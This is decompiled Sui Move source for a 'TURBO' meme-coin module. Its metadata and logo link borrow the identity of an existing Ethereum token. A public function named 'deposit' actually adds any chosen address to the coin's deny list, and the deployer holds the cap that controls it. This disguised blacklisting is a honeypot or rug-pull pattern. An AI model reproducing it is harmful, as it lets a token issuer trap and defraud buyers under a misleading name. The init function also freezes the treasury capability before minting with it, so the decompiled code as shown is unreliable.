module 0xb1acbc7eb89a2ffef0e42611def817ccb2e5a252dfceededf9a41bbd97812d76::turbo {
    struct TURBO has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TURBO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TURBO>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: TURBO, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/ethereum/0xa35923162c49cf95e6bf26623385eb431ad920d3.png?size=lg&key=ead46f                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<TURBO>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"TURBO   ")))), trim_right(b"Turbo                           "), trim_right(b"Turbo Token began as a bold experiment in cryptocurrency creation. Inspired by the power of artificial intelligence, the project's creator turned to GPT-4 with a simple challenge: create the next great meme coin.                                                                                                            "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TURBO>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TURBO>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<TURBO>>(0x2::coin::mint<TURBO>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TURBO>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

